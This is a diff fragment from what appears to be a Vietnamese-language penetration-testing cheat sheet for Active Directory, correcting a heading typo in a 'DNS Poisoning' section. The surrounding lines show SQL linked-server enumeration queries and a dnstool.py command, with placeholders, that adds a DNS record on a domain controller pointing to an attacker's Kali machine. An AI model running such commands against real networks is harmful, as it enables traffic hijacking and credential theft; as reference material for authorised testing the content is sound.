@@ -130,7 +130,7 @@ SELECT name, provider, data_source FROM sys.servers;
 SELECT * FROM OPENQUERY("SQL07", 'SELECT 1');
 ```
 
-## DNS Poisening
+## DNS Poisoning
 ```
 # Thêm bản ghi
 python3 dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -r <TÊN_BẢN_GHI_MỤC_TIÊU> -a add -d <IP_KALI_CỦA_BẠN> <IP_DOMAIN_CONTROLLER>
